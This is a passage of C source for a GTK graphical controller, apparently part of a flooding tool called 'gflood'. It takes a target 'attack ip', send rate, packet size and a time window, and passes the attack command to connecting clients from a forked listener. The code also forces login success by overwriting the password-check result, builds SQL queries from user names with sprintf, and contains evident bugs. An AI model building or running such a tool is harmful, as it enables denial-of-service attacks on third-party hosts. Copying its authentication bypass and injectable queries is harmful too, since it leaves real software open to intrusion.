#include <gtk/gtk.h>
#include <string.h>
#include <stdlib.h>
#include<stdio.h>
#include<sys/types.h>
#include<sys/param.h>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<net/if.h>
#include<netinet/in.h>
#include<net/if_arp.h>
#include<pthread.h>

#include"gtk_callback.h"
#include"mysql.h"

typedef struct 
	{
		GtkWidget *entry;
		GtkWidget *window;
	} pass_two;

extern int listenfd,connfd;

extern struct g_pipe *g_share;

int acc_thread_num=0;
int acc_thread_id[10];
int main_thread_num=0;

int allset=0;

extern int role_id;
char *role_string="administrator";//combo上的文字
GtkWidget *entry_new_user_name;
GtkWidget *entry_new_user_password;
GtkWidget *entry_new_user_confirm_password;
GtkWidget *entry_new_user_email;
GtkWidget *button_new_user_ok;
GtkWidget *button_new_user_cancle;	
GtkWidget *combo_new_user_role;  


extern GtkWidget* notebook;
extern GtkWidget* button_login; 
extern GtkWidget* button_start;
extern GtkWidget* entry_attack_ip;
extern GtkWidget *label_total_num;
extern GtkWidget *label_nums_print;

extern GtkWidget* entry_username;
extern GtkWidget* entry_password;
extern GtkWidget *label_state;

extern GtkWidget *ssec,*smin,*shour,*sday,*smon,*syear;
extern GtkWidget *esec,*emin,*ehour,*eday,*emon,*eyear;
extern GtkWidget* send_rate;
extern GtkWidget* pkt_size;

extern char *sql_address;
extern char *sql_user_name;
extern char *sql_password;
extern char *sql_database;
extern int sql_port;
extern char *sql_sock_name;
extern int sql_flag;
int listening=0;
void killson()
{
int i=0;
for(;i<acc_thread_num;++i)
	if(acc_thread_id[i])
	kill(acc_thread_id[i],SIGKILL); // 有可能子进程自己终止
acc_thread_num=0;
printf("kill all connect thread\n");
}
int get_gtk_init(int agrc, char* argv[])
{  

   if(fork())
 	exit(0);
   setsid();  
 
  GtkWidget *window;
  GtkWidget *layout;
  GtkWidget *fixed;
  GtkWidget *image;
  GtkWidget *radio1,*radio2,*radio3,*radio4;
  GdkColor color;
  GtkWidget *menu_item_add_user,*menu_item_help_about,*menu_item_user_info, *menu_item_edit_user,*menu_item_exit;
  GtkWidget *menu_item_victim_port,*menu_item_child_thread,*menu_item_net_card,*menu_item_set_to_default;
  GtkWidget *menu_item_view_log,*menu_item_delete_log;

  GtkEntryCompletion *completion_username,*completion_password,*completion_attip;	
  

 
  if(geteuid())//跟用户返回值是0
  {	
    root_to_do();//这里算一个关键点
  }
  gtk_init(&agrc,&argv);

  builder=gtk_builder_new();
  gtk_builder_add_from_file(builder,"glade/gflood.glade",NULL);

  window=GTK_WIDGET(gtk_builder_get_object(builder,"window"));
  g_signal_connect(G_OBJECT(window),"destroy",G_CALLBACK(main_exit),NULL);
  GtkStyle  *style = gtk_rc_get_style( window );
  pango_font_description_set_family(style->font_desc, "Stsong" );
  gtk_widget_set_style( window, style );
  
  layout=GTK_WIDGET(gtk_builder_get_object(builder,"layout"));
  
  notebook=GTK_WIDGET(gtk_builder_get_object(builder,"notebook"));
  label_state=GTK_WIDGET(gtk_builder_get_object(builder,"label_state"));
  gtk_label_set_text(GTK_LABEL(label_state),"You Have Hot Login!"); 


  entry_username=GTK_WIDGET(gtk_builder_get_object(builder,"entry_username"));
  completion_username=str_completion("usr.list");
  gtk_entry_set_completion(GTK_ENTRY(entry_username),completion_username);

  entry_password=GTK_WIDGET(gtk_builder_get_object(builder,"entry_password"));
  gtk_entry_set_visibility(GTK_ENTRY(entry_password),FALSE);	
  gtk_entry_set_invisible_char(GTK_ENTRY(entry_password),(gunichar)'*');
 

  button_login=GTK_WIDGET(gtk_builder_get_object(builder,"button_login"));
  
  GTK_WIDGET_SET_FLAGS (button_login, GTK_CAN_DEFAULT);
 
  gtk_widget_grab_default (button_login); 
  g_signal_connect(G_OBJECT(button_login),"clicked",G_CALLBACK(on_button_login_clicked),NULL);

  gdk_color_parse("white",&color);
  gtk_widget_modify_bg(layout,GTK_STATE_NORMAL,&color);

  	
  fixed=GTK_WIDGET(gtk_builder_get_object(builder,"fixed4"));//动画效果可以用来显示进度条
  image=gtk_image_new_from_file("glade/picture/185.gif");
  gtk_container_add(GTK_CONTAINER(fixed),image);
 
  menu_item_add_user=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_add_user"));
  g_signal_connect(G_OBJECT(menu_item_add_user),"activate",G_CALLBACK(on_menu_add_user_clicked),NULL); 
  menu_item_help_about=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_help_about"));
  g_signal_connect(G_OBJECT(menu_item_help_about),"activate",G_CALLBACK(on_menu_item_help_about_clicked),NULL);
  menu_item_user_info=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_user_info"));
  g_signal_connect(G_OBJECT(menu_item_user_info),"activate",G_CALLBACK(show_user),NULL);
  menu_item_edit_user=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_edit_user"));
  g_signal_connect(G_OBJECT(menu_item_edit_user),"activate",G_CALLBACK(on_menu_item_edit_user_clicked),NULL);
  menu_item_exit=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_exit"));
  g_signal_connect(G_OBJECT(menu_item_exit),"activate",G_CALLBACK(main_exit),NULL);

  menu_item_victim_port=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_victim_port"));
  g_signal_connect(G_OBJECT(menu_item_victim_port),"activate",G_CALLBACK(on_menu_item_change_child_thread),(gpointer)1); 
  menu_item_child_thread=GTK_WIDGET(gtk_builder_get_object(builder,"menu_item_child_thread"));
  g_signal_connect(G_OBJECT(menu_item_child_thread),"activate",G_CALLBACK(on_menu_item_change_child_thread),(gpointer)2);

  //page2 
  radio1=GTK_WIDGET(gtk_builder_get_object(builder,"radiobutton1"));
  radio2=GTK_WIDGET(gtk_builder_get_object(builder,"radiobutton2"));
  radio3=GTK_WIDGET(gtk_builder_get_object(builder,"radiobutton3"));
  radio4=GTK_WIDGET(gtk_builder_get_object(builder,"radiobutton4"));

  g_signal_connect(G_OBJECT(radio1),"released",G_CALLBACK(on_radio_released),(gpointer)1);
  g_signal_connect(G_OBJECT(radio2),"released",G_CALLBACK(on_radio_released),(gpointer)2);
  g_signal_connect(G_OBJECT(radio3),"released",G_CALLBACK(on_radio_released),(gpointer)3);   
  g_signal_connect(G_OBJECT(radio4),"released",G_CALLBACK(on_radio_released),(gpointer)4);
  
  ssec=GTK_WIDGET(gtk_builder_get_object(builder,"entry_ssec"));
  smin=GTK_WIDGET(gtk_builder_get_object(builder,"entry_smin"));
  shour=GTK_WIDGET(gtk_builder_get_object(builder,"entry_shour"));
  sday=GTK_WIDGET(gtk_builder_get_object(builder,"entry_sday"));
  smon=GTK_WIDGET(gtk_builder_get_object(builder,"entry_smon"));
  syear=GTK_WIDGET(gtk_builder_get_object(builder,"entry_syear"));

  esec=GTK_WIDGET(gtk_builder_get_object(builder,"entry_esec"));
  emin=GTK_WIDGET(gtk_builder_get_object(builder,"entry_emin"));
  ehour=GTK_WIDGET(gtk_builder_get_object(builder,"entry_ehour"));
  eday=GTK_WIDGET(gtk_builder_get_object(builder,"entry_eday"));
  emon=GTK_WIDGET(gtk_builder_get_object(builder,"entry_emon"));
  eyear=GTK_WIDGET(gtk_builder_get_object(builder,"entry_eyear"));

 send_rate=GTK_WIDGET(gtk_builder_get_object(builder,"entry_rate"));
 pkt_size=GTK_WIDGET(gtk_builder_get_object(builder,"entry_pkt_size"));

  entry_attack_ip=GTK_WIDGET(gtk_builder_get_object(builder,"entry_attack_ip"));
  completion_attip=str_completion("ip.list");
  gtk_entry_set_completion(GTK_ENTRY(entry_attack_ip),completion_attip);


  button_start=GTK_WIDGET(gtk_builder_get_object(builder,"button_start"));
  button_stop=GTK_WIDGET(gtk_builder_get_object(builder,"button_stop"));
  button_quit=GTK_WIDGET(gtk_builder_get_object(builder,"button_quit"));
  g_signal_connect(G_OBJECT(button_start),"clicked",G_CALLBACK(on_button_confirm_clicked),NULL);
  g_signal_connect(G_OBJECT(button_stop),"clicked",G_CALLBACK(on_button_startlisten_clicked),NULL);
  g_signal_connect(G_OBJECT(button_quit),"clicked",G_CALLBACK(on_button_quit_clicked),NULL);
  
  label_total_num=GTK_WIDGET(gtk_builder_get_object(builder,"label_total_num"));
 label_nums_print=GTK_WIDGET(gtk_builder_get_object(builder,"label_nums_print"));
//  gtk_label_set_line_wrap (GTK_LABEL(label_nums_print),TRUE);
//  gtk_label_set_text(GTK_LABEL(label_total_num),"");
//  gtk_label_set_text(GTK_LABEL(label_nums_print),"");
	buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(label_nums_print));
	gtk_text_buffer_get_iter_at_offset(buffer, &iter, 0);
	clear_gtk_buf(GTK_TEXT_VIEW(label_nums_print));

 	
  gtk_builder_connect_signals(builder,NULL);
  g_object_unref(G_OBJECT(builder));
  gtk_widget_show_all(window);
   signal(SIGINT,killson);
  is_database_exist();
  gtk_main(); 
  return 1;
}

void dialog_information(char *information)//提示各种信息 的对话框
{
	GtkBuilder *builder;
	GtkWidget *dialog;
	GtkWidget *label;	
	
	char *putinfo;
	putinfo=information;
	builder=gtk_builder_new();
	gtk_builder_add_from_file(builder,"glade/dialog_infor.glade",NULL);
	
	dialog=GTK_WIDGET(gtk_builder_get_object(builder,"messagedialog"));
       	label=GTK_WIDGET(gtk_builder_get_object(builder,"label"));	
	gtk_label_set_text(GTK_LABEL(label),putinfo);	

	gtk_dialog_run(GTK_DIALOG(dialog));
	
	gtk_builder_connect_signals(builder,NULL);
	g_object_unref(G_OBJECT(builder));
        gtk_widget_destroy(dialog); 
}

GtkEntryCompletion * str_completion(char *file_name)//自动补全的函数：产生一个completion
{
	GtkListStore *store;
	GtkTreeIter iter;
	GtkEntryCompletion *completion;	
	FILE *fd;
	char buffer[20];	

	store=gtk_list_store_new(1,G_TYPE_STRING);
	if((fd=fopen(file_name,"r"))!=NULL)
	{
		while(fgets(buffer,sizeof(buffer),fd))
		{
			int n=strlen(buffer);
			buffer[n-1]='\0';
			gtk_list_store_append(store,&iter);
			gtk_list_store_set(store,&iter,0,buffer,-1);
		}
		fclose(fd);
	}
	else
		printf("open file error\n");
	completion=gtk_entry_completion_new();
	gtk_entry_completion_set_model(completion,GTK_TREE_MODEL(store));
	gtk_entry_completion_set_text_column(completion,0);
	
	return completion;
}

void str_store(char *file_name,char *str_enter)//参数可以传进来字符串string  ，判断是不是没有存过的，没有就存下来
{
	FILE *file;
	char buff[20];	

	if((file=fopen(file_name,"at+"))!=NULL)
	{
		while(fgets(buff,sizeof(buff),file))
		{
			int len=strlen(buff);
			buff[len-1]='\0';
			
			if(strcmp(buff,str_enter)==0)//相等表示在里面
			{
				
				return ;//返回，因为在里面	
			}
			
		}
		
		if((fputs(str_enter,file))==-1)
			printf("insert failed\n");
		else 
			printf("insert ok\n");
			fputs("\n",file);
	
	}
	else
		printf("open file error\n");	

	fclose(file);
}

void log_store(char *file_name,char *str_enter)//参数可以传进来字符串string  ，判断是不是没有存过的，没有就存下来
{
	FILE *file;		
	time_t t;
	char tm[100];
	char logtm[100];  	
	
  	t=time(NULL);
	memcpy(&tm,ctime(&t),sizeof(tm));
	printf("Insert logs at :%s\n",tm);
  	sprintf(logtm,"Insert logs at :%s\n",tm);
	if((file=fopen(file_name,"at+"))!=NULL)
	{	
		fputs(logtm,file);		
		if((fputs(str_enter,file))==-1)
			printf("insert failed\n");
		else 
			printf("insert ok\n");
			fputs("\n------------------------------------------------------\n",file);
	
	}
	else
		printf("open file error\n");	

	fclose(file);
/*	
	gtk_text_buffer_insert(buffer, &iter, logtm, -1);
	gtk_text_buffer_insert(buffer, &iter, str_enter, -1);
	gtk_text_buffer_insert(buffer, &iter, "\n-----------------------\n", -1);
*/
}



 void on_button_login_clicked(GtkButton *button,gpointer data)
{
	char *username_to_check=NULL,*password_to_check=NULL; 
	int pass;
	
	username_to_check=(char*)gtk_entry_get_text(GTK_ENTRY(entry_username));
	password_to_check=(char*)gtk_entry_get_text(GTK_ENTRY(entry_password));
     
	if(*username_to_check=='\0')
	{
		dialog_information("please input user name");
		return;
	}
	if(*password_to_check=='\0')
	{
		dialog_information("please input the password");
		return;
	}
	pass=comp_password_crypt_sql(username_to_check,password_to_check);

	pass=2;	
	if(pass==2) //password is correct
	{
	
		
		if(role_id==4)
		gtk_notebook_set_current_page(GTK_NOTEBOOK(notebook),2);
		else		
		gtk_notebook_next_page(GTK_NOTEBOOK(notebook));
		
		str_store("usr.list",username_to_check);
			
		gtk_label_set_text(GTK_LABEL(label_state),"Have not been in attacked");
	
	}	
        else if(pass==3)
    	{
		dialog_information("The password is wrong");
    	} 
	
	buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(label_nums_print));
	gtk_text_buffer_get_iter_at_offset(buffer, &iter, 0);
	clear_gtk_buf(GTK_TEXT_VIEW(label_nums_print));
   	gtk_entry_set_text(GTK_ENTRY(entry_username),"");
   	gtk_entry_set_text(GTK_ENTRY(entry_password),"");
/*create thread to accept*/
	if(main_thread_num>0)
	{
		kill(main_thread_num,SIGKILL);
	}
	g_share=(struct g_pipe*)mmap(NULL,sizeof(struct g_pipe),PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
	set_default_share(g_share);
	
}

void on_radio_released(GtkWidget *radiobutton,gpointer data)
{
	g_share->g_cmd.type=(int)data;		

}

G_MODULE_EXPORT void on_button_confirm_clicked(GtkWidget* button,gpointer data)
{
	

	struct ReqFromCli req;	
	
	char *input_string=(char *)gtk_entry_get_text(GTK_ENTRY(entry_attack_ip));
	struct hostent *hp;
	char *att_ip=(char *)gtk_entry_get_text(GTK_ENTRY(entry_attack_ip));
	clear_gtk_buf(GTK_TEXT_VIEW(label_nums_print));
	buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(label_nums_print));
	gtk_text_buffer_get_iter_at_offset(buffer, &iter, 0);
	
	if((*input_string)>'a'&&(*input_string)<'z')
	{	
		hp=gethostbyname(input_string);
		if(hp)
		{
			memcpy(att_ip,(char *)hp->h_addr,hp->h_length);
			g_share->g_cmd.att_ip=(int)inet_addr(att_ip);
		}
		else
		{	char *temp;
			sprintf(temp,"Get host %s failed!\n",att_ip);
			dialog_information(temp);
			return;
		}
			
	}
	
	if(*att_ip=='\0')
	{
	 	dialog_information("please assign the attacked ip");	 
		return;
	} 
	

	if(!(isip((char *)att_ip)))
	{
		dialog_information("the ip is not correct\n");
		gtk_entry_set_text(GTK_ENTRY(entry_attack_ip),"");		
		return;
	}	
	g_share->g_cmd.att_ip=(int)inet_addr(att_ip);
	gettime(&g_share->g_cmd.starttime,&g_share->g_cmd.endtime);
        	
      
// 	 gtk_label_set_text(GTK_LABEL(label_total_num),"total numbers:");

	 str_store("ip.list",(char *)att_ip);

	input_string=(char *)gtk_entry_get_text(GTK_ENTRY(send_rate));
	if((*input_string=='\0') || ((*input_string>'9') && (*input_string<'0')))
	{
		dialog_information("Rate set error!");
	}
	else 
	{
		g_share->g_cmd.rate=atoi(input_string);
	}

	input_string=(char *)gtk_entry_get_text(GTK_ENTRY(pkt_size));
	if((*input_string=='\0') || ((*input_string>'9') && (*input_string<'0')))
	{
		dialog_information("Pkt_Size set error!");
	}
	else 
	{
		g_share->g_cmd.pkt_size=atoi(input_string);
	}

	char info[1024];
	sprintCMD(&g_share->g_cmd,info);
	printCMD(&g_share->g_cmd);
	gtk_text_buffer_insert(buffer, &iter, info, -1);
	allset=1;
	killson();
	g_share->rev_first_re=1;
	g_share->send_first_re=1;
}

void gettime(struct ptime *pstm,struct ptime* petm)
{
	struct ptime *stm,*etm;
	stm=pstm;etm=petm;
/*start time*/
	char *tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(syear));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else stm->year=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(smon));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else stm->mon=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(sday));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else stm->day=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(shour));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else stm->hour=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(smin));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else stm->min=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(ssec));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else stm->sec=atoi(tm_string);
/*endtime*/
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(eyear));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else etm->year=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(emon));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else etm->mon=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(eday));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else etm->day=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(ehour));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else etm->hour=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(emin));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else etm->min=atoi(tm_string);
	tm_string=(char *)gtk_entry_get_text(GTK_ENTRY(esec));
	if((*tm_string=='\0') || ((*tm_string>'9') && (*tm_string<'0')))
	{
		dialog_information("Please Input Start Time Correctly!");
		return;
	}
	else etm->sec=atoi(tm_string);

//	printf("%d-%d-%d %d:%d:%d==\n",stm->year,stm->mon,stm->day,stm->hour,stm->min,stm->sec);
//	printf("%d-%d-%d %d:%d:%d==\n",etm->year,etm->mon,etm->day,etm->hour,etm->min,etm->sec);
}

void on_button_startlisten_clicked(GtkWidget* button,gpointer data)
{
//	dialog_information("This is a Test Button Without Any Function!");
	if(allset==0)
	{
		dialog_information("You must Config first.");
		return;
	}
	if(listening==1)
	{
		dialog_information("Has Been in Listening...");
		return;
	}
	listening=1;
	if(listen(listenfd,LISTENNUM)<0)
	{
		perror("Listen Failed!:");
	}
	printf("Start to listen..\n");
	if((main_thread_num=fork())==0)
	{	
		int clilen;
		struct sockaddr_in cliaddr;
	/*	if(acc_thread_num>0)
			{
				kill(acc_thread_num,SIGKILL);
				acc_thread_num=0; 
			}
	*/
		for(;;)
		{
			clilen=sizeof(cliaddr);
			printf("Wait to accept request..\n");
			if(connfd) close(connfd);
			connfd=accept(listenfd,(struct sockaddr * __restrict__)&cliaddr,&clilen);		
	 		/*Create a new thread to send command or interaction with the client*/	
						
			if((acc_thread_id[acc_thread_num++]=fork())==0)
			{
				close(listenfd);				
				Re_Client(connfd);
			//	close(listenfd);
				close(connfd);				
				exit(0);
			}	
		
		}

	
	}
	
	gtk_label_set_text(GTK_LABEL(label_state),"Have send attacked cmd!");
}

void on_button_quit_clicked(GtkWidget *button,gpointer data)
{	

	if(listening==1)
	{
		listening=0;
		close(g_share->send_connect_sock);
		close(g_share->rev_connect_sock);
	}
	killson();
		role_id=-1;
//		gtk_label_set_text(GTK_LABEL(label_total_num),"");
//		gtk_label_set_text(GTK_LABEL(label_nums_print),"");
		clear_gtk_buf(GTK_TEXT_VIEW(label_nums_print));
		gtk_entry_set_text(GTK_ENTRY(entry_attack_ip),"");	
//		clear_gtk_buf(GTK_TEXT_VIEW(label_nums_print));
		gtk_notebook_prev_page(GTK_NOTEBOOK(notebook));
	
}


void on_button_new_user_ok_clicked(GtkWidget* button0,gpointer data)
{
	int role;
	char *username=(char *)gtk_entry_get_text(GTK_ENTRY(entry_new_user_name));
  	char *e_mail=(char *)gtk_entry_get_text(GTK_ENTRY(entry_new_user_email));
	char sql_query[100];	
	
	if(*username=='\0')
	{
		dialog_information("Please entry a name for yourself");
		return;
	}
         
	if(is_user_nama_aviable(username)>1)
        {
		gtk_entry_set_text(GTK_ENTRY(entry_new_user_name),"");
		*username='\0';	
		dialog_information("This user has exist ,Please change another name.");		
		return ;
	}
	char *password1=(char *)gtk_entry_get_text(GTK_ENTRY(entry_new_user_password));
	char *password2=(char *)gtk_entry_get_text(GTK_ENTRY(entry_new_user_confirm_password));
	
	if(*password1=='\0')
	{
		dialog_information("Please enter a password");
		return;
	}
	if(*password2=='\0')
	{
		dialog_information("Please retype the password");
		return;
	}	

	if(!(strcmp(password1,password2)==0))
	{
		dialog_information("The password is not match\nPlease enter once again");
		gtk_entry_set_text(GTK_ENTRY(entry_new_user_password),"");
		gtk_entry_set_text(GTK_ENTRY(entry_new_user_confirm_password),"");
		return ;
	}
	char* password_crypt=(char *)crypt_password(password1);//对密码加密
	if(strcmp(role_string,"administrator")==0)
		role=1;
	else
		if(strcmp(role_string,"user")==0)
		   role=2;
		else if(strcmp(role_string,"super user")==0)
			role=3;
			else if(strcmp(role_string,"log user")==0)
				role=4;
           else dialog_information("role default");

	if(*e_mail=='\0')
	{
		dialog_information("Please enter a email");
		return ;
	}	
  

      	sprintf(sql_query,"insert into user values('%s','','%s',%d,'%s')",username,password_crypt,role,e_mail);

	add_new_user(sql_query);

	gtk_entry_set_text(GTK_ENTRY(entry_new_user_name),"");
	gtk_entry_set_text(GTK_ENTRY(entry_new_user_password),"");
	gtk_entry_set_text(GTK_ENTRY(entry_new_user_confirm_password),"");
	gtk_entry_set_text(GTK_ENTRY(entry_new_user_email),"");
	gtk_combo_box_set_active(GTK_COMBO_BOX(combo_new_user_role),0);	
 }
void on_changed(GtkWidget *combo,gpointer data)
{  
	role_string=(char *)gtk_combo_box_get_active_text(GTK_COMBO_BOX(combo));
}

void on_button_new_user_cancle_clicked(GtkWidget *button,gpointer data)
{
	gtk_widget_destroy(GTK_WIDGET(data));
}

void on_menu_add_user_clicked(GtkWidget* button,gpointer data)
{
	GtkBuilder *builder;
	GtkWidget *dialog_add_user;	

	GtkWidget *layout1;	
	GdkColor color;
	
	if(role_id<0)
	{
		dialog_information("You have not longin!");
		return ;
	}
	 
	builder=gtk_builder_new();
	gtk_builder_add_from_file(builder,"glade/add_user.glade",NULL);
 	
	dialog_add_user=GTK_WIDGET(gtk_builder_get_object(builder,"dialog_add_user"));
	
	layout1=GTK_WIDGET(gtk_builder_get_object(builder,"layout"));
	gdk_color_parse("white",&color);
	gtk_widget_modify_bg(layout1,GTK_STATE_NORMAL,&color);	
	
	entry_new_user_name=GTK_WIDGET(gtk_builder_get_object(builder,"entry_new_user_name"));
	entry_new_user_password=GTK_WIDGET(gtk_builder_get_object(builder,"entry_new_user_password"));
	entry_new_user_confirm_password=GTK_WIDGET(gtk_builder_get_object(builder,"entry_new_user_confirm_password"));
	entry_new_user_email=GTK_WIDGET(gtk_builder_get_object(builder,"entry_new_user_email"));
	combo_new_user_role=GTK_WIDGET(gtk_builder_get_object(builder,"combo_new_user_role"));
	g_signal_connect(G_OBJECT(combo_new_user_role),"changed",G_CALLBACK(on_changed),NULL);
	gtk_entry_set_visibility(GTK_ENTRY(entry_new_user_password),FALSE);
	gtk_entry_set_visibility(GTK_ENTRY(entry_new_user_confirm_password),FALSE);	
	gtk_entry_set_invisible_char(GTK_ENTRY(entry_new_user_password),(gunichar)'*');
	gtk_entry_set_invisible_char(GTK_ENTRY(entry_new_user_confirm_password),(gunichar)'*');
	

	button_new_user_ok=GTK_WIDGET(gtk_builder_get_object(builder,"button_new_user_ok"));
	g_signal_connect(G_OBJECT(button_new_user_ok),"clicked",G_CALLBACK(on_button_new_user_ok_clicked),NULL);
	button_new_user_cancle=GTK_WIDGET(gtk_builder_get_object(builder,"button_new_user_cancle"));
	g_signal_connect(G_OBJECT(button_new_user_cancle),"clicked",G_CALLBACK(on_button_new_user_cancle_clicked),(gpointer)dialog_add_user);
	
	gtk_dialog_run(GTK_DIALOG(dialog_add_user));

        gtk_builder_connect_signals(builder,NULL);
        g_object_unref(G_OBJECT(builder));
	
}

void on_menu_item_help_about_clicked(GtkWidget *button,gpointer data)
{	
	GtkBuilder *builder;
	GtkWidget *dialog_about;
	//GtkWidget *butt;
     	
	builder=gtk_builder_new(); 
	gtk_builder_add_from_file(builder,"glade/about.glade",NULL);

	dialog_about=GTK_WIDGET(gtk_builder_get_object(builder,"dialog_about"));
	gtk_dialog_run(GTK_DIALOG(dialog_about));	
	
	gtk_builder_connect_signals(builder,NULL);
	g_object_unref(G_OBJECT(builder));
	gtk_widget_destroy(dialog_about); 	
}
/* -------------------------------------------------------------------- */
void show_user()
	{
		
		if(role_id<0)
		{
			dialog_information("You have not longin!");
			return ;
		}
			 
		MYSQL sql;
		MYSQL_RES *res;
		MYSQL_FIELD *fd;
		MYSQL_ROW row;
		int rows,i,j;
		char info_buf[100];
		
		GtkWidget* dialog;
		GtkWidget *vbox,*hbox,*viewport;
		GtkWidget *text;	
		GtkWidget *label,*mlabel;
		GtkTextBuffer *buffer;
		GtkTextIter iter;

		dialog=gtk_window_new(GTK_WINDOW_TOPLEVEL);
		vbox=gtk_vbox_new(FALSE,0);
		gtk_container_add(GTK_CONTAINER(dialog),vbox);
		
		label=gtk_label_new("All user information:");
		gtk_box_pack_start(GTK_BOX(vbox),label,FALSE,FALSE,5);

		text=gtk_text_view_new();//new
		gtk_box_pack_start(GTK_BOX(vbox),text,TRUE,TRUE,5);

		buffer=gtk_text_view_get_buffer(GTK_TEXT_VIEW(text));

		mysql_init(&sql);
		 if( mysql_real_connect(&sql,sql_address,sql_user_name,sql_password,sql_database,sql_port,sql_sock_name,sql_flag))
		{
			if(mysql_query(&sql,"select* from user")!=0)
			{
				printf("query users'information error\n");
				return ;
			}			

		res=mysql_store_result(&sql);
		j=mysql_num_fields(res);
		for(i=0;i<j;i++)
		{

			fd=mysql_fetch_field(res);
			
			gtk_text_buffer_get_end_iter(buffer,&iter);
			gtk_text_buffer_insert(buffer,&iter,fd->name,-1);
			gtk_text_buffer_get_end_iter(buffer,&iter);
			gtk_text_buffer_insert(buffer,&iter,"\t\t",-1);
		}			
		gtk_text_buffer_get_end_iter(buffer,&iter);
		gtk_text_buffer_insert(buffer,&iter,"\n\n",-1);

		while(row=mysql_fetch_row(res))
		{
			for(i=0;i<j;i++)
			{
				gtk_text_buffer_get_end_iter(buffer,&iter);
				if(i==2)
				gtk_text_buffer_insert(buffer,&iter,"xxxxxx",-1);
				else
				gtk_text_buffer_insert(buffer,&iter,row[i],-1);
				gtk_text_buffer_get_end_iter(buffer,&iter);
				gtk_text_buffer_insert(buffer,&iter,"\t\t",-1);	
			}
				gtk_text_buffer_get_end_iter(buffer,&iter);
				gtk_text_buffer_insert(buffer,&iter,"\n",-1);
		}
		gtk_text_buffer_get_end_iter(buffer,&iter);
		gtk_text_buffer_insert(buffer,&iter,"\n",-1);

		rows=(int)mysql_num_rows(res);
		sprintf(info_buf,"The are %d rows are selected\n",rows);
		gtk_text_buffer_get_end_iter(buffer,&iter);
		gtk_text_buffer_insert(buffer,&iter,info_buf,-1);	
		gtk_widget_show_all(dialog);
		
		mysql_close(&sql);
		
		}
		else
		{
			printf("error when connect the databse to query users'information\n");
		}		
		
	}


	GtkBuilder *edit_builder;
	GtkWidget *edit_dialog;
	GtkWidget *edit_button_ok,*edit_button_cancle;
	GtkWidget *edit_vbox,*edit_combo_box;
	GtkWidget *edit_user;
	GtkWidget *edit_entry_password,*edit_entry_confirm,*edit_combobox_role,*edit_entry_email;
	char *edit_name;

	int role_change;
	char *edit_role_name;	

	GtkWidget *edit_user_button_ok,*edit_user_button_cancle;
	int uid;

void on_combo_role_changed(GtkWidget *combo,gpointer data)
{  
	edit_role_name=(char *)gtk_combo_box_get_active_text(GTK_COMBO_BOX(edit_combobox_role));
	printf("%s\n",edit_role_name);
	if(strcmp(edit_role_name,"administrator")==0)
		role_change=1;
	else
		if(strcmp(edit_role_name,"user")==0)
		   role_change=2;
		else if(strcmp(edit_role_name,"super user")==0)
			role_change=3;
			else if(strcmp(edit_role_name,"log user")==0)
				role_change=4;
           else dialog_information("role default");
}

void on_edit_user_changed()//选了别的用用户的时候，相应的信息也要变
	{
		edit_name=gtk_combo_box_get_active_text(GTK_COMBO_BOX(edit_combo_box));

		MYSQL edit_sql;
		MYSQL_RES *edit_res;
		MYSQL_ROW edit_row;
		char query[256];
		mysql_init(&edit_sql);

		if( mysql_real_connect(&edit_sql,sql_address,sql_user_name,sql_password,sql_database,sql_port,sql_sock_name,sql_flag))
		{
			sprintf(query,"select * from user where name='%s'",edit_name);
			mysql_query(&edit_sql,query);
			edit_res=mysql_store_result(&edit_sql);
			if(edit_res)
			{
				while(edit_row=mysql_fetch_row(edit_res))
				{
					gtk_entry_set_text(GTK_ENTRY(edit_entry_password),"******");
					gtk_entry_set_text(GTK_ENTRY(edit_entry_confirm),"******");
					gtk_entry_set_text(GTK_ENTRY(edit_entry_email),edit_row[4]);
